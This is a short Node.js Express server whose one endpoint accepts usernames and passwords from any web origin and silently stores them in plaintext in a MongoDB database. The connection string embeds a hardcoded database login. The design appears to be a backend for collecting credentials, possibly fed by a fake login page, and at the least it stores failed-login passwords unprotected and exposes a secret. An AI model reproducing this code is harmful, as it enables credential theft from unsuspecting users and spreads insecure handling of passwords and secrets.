const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Connect to MongoDB
mongoose.connect('mongodb+srv://sisyphus:rainman@cluster0.wvu0o.mongodb.net/', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Define Schema
const attemptSchema = new mongoose.Schema({
  username: String,
  password: String,
  timestamp: { type: Date, default: Date.now }
});

const Attempt = mongoose.model('Attempt', attemptSchema);

// API to save failed attempts
app.post('/api/log-failed-attempt', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    const attempt = new Attempt({ username, password });
    await attempt.save();
    res.status(200).send(); // Silent success
  } catch (err) {
    console.error("MongoDB save error:", err);
    res.status(500).send();
  }
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));